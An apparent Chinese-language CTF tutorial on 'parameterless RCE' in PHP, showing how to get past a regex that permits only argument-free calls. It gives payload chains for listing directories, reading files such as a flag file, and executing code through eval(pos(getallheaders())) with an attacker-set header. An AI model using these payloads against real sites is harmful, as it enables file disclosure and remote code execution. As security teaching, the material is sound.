---
title: 无参数RCE
date: 2020-09-20 17:00:00
categories: 
  - web安全
  - ctf
keywords:
  - 无参数RCE
tags:
  - 无参数RCE

---

## 代码解析

```php
preg_replace('/[^\w]+\((?R)?\)/', '', $_GET['code'])
```

`\w`意思是匹配字母数字和下划线，`(?R)?`的意思是递归整个匹配模式。

所以正则的含义就是匹配无参数的函数，而且内部可以无限嵌套相同的模式。

## 无参数任意文件读取

### 查看当前目录文件名

`print_r(scandir('.'));`可以用来查看当前所有文件名，但是这里包含了参数，这里介绍几个方法。

1. **localeconv()**

`localeconv()`返回一包含本地数字及货币格式信息的数组。而数组的第一项就是"."。

![](https://pic4.zhimg.com/80/v2-a589d3830e15875d2429f6f1c02c7900_720w.jpg)

这里的点有了，但是如何获取它呢？

`current()`返回数组中的单元，默认取第一个值：

![](https://picb.zhimg.com/80/v2-ff42485e2f4cc1889ea864afce818334_720w.jpg)

`print_r(scandir(current(localeconv())));`成功打印出当前目录下文件：

![](https://pic4.zhimg.com/80/v2-14b86a47bcb6797f07c3940199a5f2b0_720w.jpg)

但是当`current()`被过滤的时候，可以使用`pos`，如果还被过滤，还可以使用`reset()`，该函数返回第一个单元的值。

2. chr(46)

`chr(46)`就是字符"."

要构造46，有几个方法：

> chr(rand()) //不实际，看运气
>
> chr(time())
>
> chr(current(localetime(time())))

* chr(time())

`chr()`函数以256为一个周期，所以`chr(46),chr(302),chr(558)`都等于`"."`，所以使用`chr(time())`，一个周期必定出现一次`"."`

* chr(current(localetime(time())))

数组第一个值每秒+1，所以最多60秒就一定能得到46，用`current(pos)`就能得到`"."`

![](https://picb.zhimg.com/80/v2-8a73a41c753ee1467be6c79aaedf592d_720w.jpg)

3. phpversion()

`phpversion()`返回php版本，如5.5.9

`floor(phpversion())`返回5

`sqrt(floor(phpversion()))`返回2.2360679774998

`tan(floor(sqrt(floor(phpversion()))))`返回-2.1850398632615

`cosh(tan(floor(sqrt(floor(phpversion())))))`返回4.5017381103491

`sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))`返回45.081318677156

`ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))`返回46

![](https://pic1.zhimg.com/80/v2-905df3c592def0df1948318b4223b6e6_720w.jpg)

`chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))`返回"."

### 读取当前目录文件

前面的方法是输出的是数组，文件名是数组的值，而我们需要读取文件的数组：

![](https://pic4.zhimg.com/80/v2-497feb96f8aa8b625221220b685373eb_720w.jpg)

有了这些方法之后，我们就可以利用`show_source(),readfile(),highlight_file(),file_get_contents()`等文件函数都可以(使用`readfile`和`file_get_contents`读取的文件显示在源码处)

ps:`readfile()`也可以读文件，常用于绕过过滤

我们添加`zflag.php`使其排序在`index.php`后成为最后一个文件

![](https://pic1.zhimg.com/80/v2-eb686ac068097f63b3bcc1f9fd1e63b1_720w.png)

![](https://pic3.zhimg.com/v2-6eadae68a3822254f0cd5193039901e8_r.jpg)

再介绍一个函数：`array_reverse()`以相反的元素顺序返回数组

`zflag.php`本来在最后一位，反过来就成为第一位，可以直接用`current(pos)`读取

```php
show_source(current(array_reverse(scandir(getcwd()))));
```

![](https://pic1.zhimg.com/80/v2-c82083833f45395fa0902a2b563aa1f9_720w.jpg)

如果是倒数第二个我们可以用：

```php
show_source(next(array_reverse(scandir(getcwd()))));
```

如果不是数组的最后一个或者倒数第二个呢？

还可以使用

```php
array_rand(array_flip(scandir(getcwd())));
```

或者：

```php
show_source(array_rand(array_flip(scandir(current(localeconv())))));
```

## 无参数命令执行(RCE)

既然传入的`code`值不能含有参数，那我们可以把参数放在别的地方，`code`用无参数函数来接受参数。

首先想到`headers`，因为`headers`我们用户可控，于是在`php`手册中搜索：`headers`

![](https://pic2.zhimg.com/80/v2-38e7b29d4b5d1881094fc9140e0af7f9_720w.jpg)

### getallheaders()&apache_request_headers()

`getallheaders()`是`apache_request_headers()`的别名函数，但是该函数只能在`Apache`环境下使用![](https://pic1.zhimg.com/80/v2-aa4f8adf4e9a6492247feac2129f62a2_720w.jpg)

这样的话，任何头部都可以利用：

![](https://pic3.zhimg.com/80/v2-7fe48549b1dbbac372da5c033bacefe7_720w.png)

```php
?code=eval(pos(getallheaders()));
//header
Leon: phpinfo();
```

![](https://pic1.zhimg.com/80/v2-b8952c9e4f6ff48161e4459aeaf2f125_720w.jpg)

因为这里`Leon:phpindfo();`排在第一位，所以直接用`pos(current的别名)`取第一个数组的值

![](https://pic4.zhimg.com/80/v2-1bfe188cda410d9b9b342ad9363eb0f8_720w.jpg)

当然，在系统函数没有禁用的情况下，我们还可以直接使用系统函数：

![](https://picb.zhimg.com/80/v2-f76c73ec8b329736a71f54ada4caca02_720w.jpg)

根据位置的不同，可以结合前文，构造获取不同位置的数组